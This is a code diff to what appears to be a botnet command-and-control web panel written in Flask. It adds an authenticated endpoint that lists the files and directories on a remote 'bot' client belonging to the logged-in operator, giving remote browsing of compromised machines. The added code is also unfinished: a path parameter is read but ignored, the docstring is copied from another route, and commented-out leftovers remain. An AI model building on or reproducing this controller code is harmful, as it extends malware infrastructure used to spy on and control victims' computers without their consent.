@@ -81,6 +81,40 @@ def session_cmd():
 		return "Bot " + str(session_uid) + " is offline or does not exist."
 
 
+@session.route("/api/session/flist", methods=["POST"])
+@login_required
+def session_flist():
+    
+	"""Send commands to clients and return the response."""
+	session_uid = request.form.get('session_uid')
+
+	# validate session id is valid integer
+	if not session_uid:
+		flash("Invalid bot UID: " + str(session_uid))
+		return redirect(url_for('main.sessions'))
+
+	path = request.args.get('path')
+
+	# get user sessions
+	owner_sessions = c2.sessions.get(current_user.username, {})
+
+	if session_uid in owner_sessions:
+		session_thread = owner_sessions[session_uid]
+
+		# send task and get response
+		response,_ = session_thread.list_dir_file("")
+		# response = session_thread.recv_task()
+		
+		# update task record with result in database
+		# result = task_dao.handle_task(response)
+  
+		return response
+
+		# return str(result['result']).encode()
+
+	else:
+		return "Bot " + str(session_uid) + " is offline or does not exist."
+
 @session.route("/api/session/poll", methods=["GET"])
 @login_required
 def session_poll():
